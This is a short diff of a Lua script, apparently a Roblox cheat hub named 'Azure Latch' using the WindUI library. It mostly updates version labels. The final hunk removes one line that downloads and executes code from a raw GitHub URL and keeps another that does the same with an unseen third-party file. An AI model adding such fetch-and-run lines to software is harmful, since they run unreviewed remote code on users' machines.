@@ -47,7 +47,7 @@ local Window = WindUI:CreateWindow({
 
     Watermark = {
         Enabled = true,
-        Text = "AbyssUI v4 — Azure Latch",
+        Text = "AbyssUI v4.0.1 — Azure Latch",
         Position = "bottom-right",
         Opacity = 0.45,
         Size = 13,
@@ -62,7 +62,7 @@ end, {
 })
 
 Window:Tag({
-    Title = "v3",
+    Title = "v4.0.1",
     Color = Color3.fromRGB(248, 155, 41),
     Icon = "github",
 })
@@ -163,7 +163,7 @@ local homeStats = HomeTab:Stats({
     Desc  = "Live stats for your session.",
     Items = {
         { Key = "Script",   Value = "Azure Latch" },
-        { Key = "Version",  Value = "v4" },
+        { Key = "Version",  Value = "v4.0.1" },
         { Key = "Author",   Value = "Tze" },
         { Key = "Toggle",   Value = "L key" },
     },
@@ -1927,7 +1927,6 @@ trapHelperSection:Toggle({
 })
 
 local trapGroup = trapHelperSection:Group({})
--- Using separate elements since Group doesn't support Slider directly in all versions
 trapHelperSection:Slider({
     Title = "Trap Max Distance",
     Step  = 1,
@@ -2590,5 +2589,4 @@ WindUI:Notify({
     Duration = 5,
 })
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ghostofcelleron/Scripts/refs/heads/main/oldthingyep", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/jonathabejose-alt/Moveset-Hub/refs/heads/main/ignored%20is%20lol.lua", true))()
